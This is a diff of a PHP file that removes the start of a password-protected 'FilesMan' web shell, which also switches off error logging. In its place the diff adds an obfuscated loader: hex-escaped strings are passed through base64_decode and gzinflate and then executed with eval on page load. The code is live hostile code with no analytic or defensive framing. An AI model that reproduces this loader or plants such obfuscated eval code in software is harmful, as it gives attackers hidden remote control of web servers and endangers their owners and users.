@@ -1,23 +1,8 @@
 <?php
-session_start();
-@set_time_limit(0);
-@clearstatcache();
-@ini_set('error_log', NULL);
-@ini_set('log_errors', 0);
-@ini_set('max_execution_time', 0);
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-
-
-/* Configuration */
-/* Password using md5 hashes */
-$password = "b19d923cf68faaa9bc2de3e5b8fe19dd"; //password-here
-$default_action = "FilesMan";
-$default_use_ajax = true;
-$default_charset = 'UTF-8';
-date_default_timezone_set("Asia/Jakarta");
-function login_shell()
-{
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3doorzkF4m2Uxp\x41\x61Pf\x2bRm\x62Vu\x4193tW485oI\x61Tfk\x62T/F\x2bNj78i4q6d/SLWLH63K5fo\x425\x42yjU\x62RW1\x62I6\x42hvkD\x43ENz\x62U\x62/0FJMMZeE29IdQRKE\x63\x42\x63/y\x42QWFR5SyyN\x43mnxNH\x61q3HVy5FFZwQDKkUDG\x639DPymlJ\x41JF31\x62GlQT\x639oiLi32zeqlZMmZxrpyyt\x41XXR\x43TPEQPIWM\x62ts6\x41xUMkye\x41LiPvw7wgtIslsXdFSZvQm/Ol\x2bS84LPoj3wzsfV\x43tU2\x61JnSWqMVuq3VEunsWHl2xxtWKxDOI3wr6\x61M123y\x61PSS/\x2bXyNFiKhUOH04FS3To72oShkIE\x61vo73Ym6\x639eJuWpJDyejyIssh\x63Ug\x41us4GQ\x41\x63UVNVZm7k/v\x639v/tR28gr0U56rZNX\x61Sv4USytl\x41fI3DhJ5\x2bDKWXMyO2\x63j\x61Y7IEqD9vw3HD\x42MDvUURWm/KHQN\x42wJe\x2b/\x62\x41\x41Fg/6GQR\x42wJe\x2b/\x61\x41QFg/qGQV\x42wJe\x2b/Z\x41gFg/\x61GQZ\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
 ?>
         <!DOCTYPE html>
     <html lang="en">
